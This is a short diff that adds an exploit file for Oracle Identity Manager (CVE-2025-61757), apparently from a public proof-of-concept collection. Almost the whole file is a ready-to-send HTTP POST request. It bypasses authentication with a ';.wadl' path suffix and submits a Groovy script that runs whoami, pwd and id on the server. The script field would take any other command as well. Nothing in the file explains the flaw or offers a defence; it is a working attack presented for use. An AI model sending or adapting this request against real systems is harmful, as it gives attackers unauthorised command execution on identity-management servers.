@@ -1,0 +1,13 @@
+# Oracle Identity Manager系统的认证绕过和远程命令执行漏洞(CVE-2025-61757)
+POST /iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus;.wadl HTTP/1.1
+Host: www.xwd_test.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept: */*
+Content-Type: application/json
+Connection: close
+Content-Length: 302
+
+{
+    "script": "def result = new StringBuilder()\nresult.append(\"USER: \").append(\"whoami\".execute().text.trim())\nresult.append(\"\\nPWD: \").append(\"pwd\".execute().text.trim())\nresult.append(\"\\nID: \").append(\"id\".execute().text.trim())\nreturn result.toString()",
+    "compile": true
+}
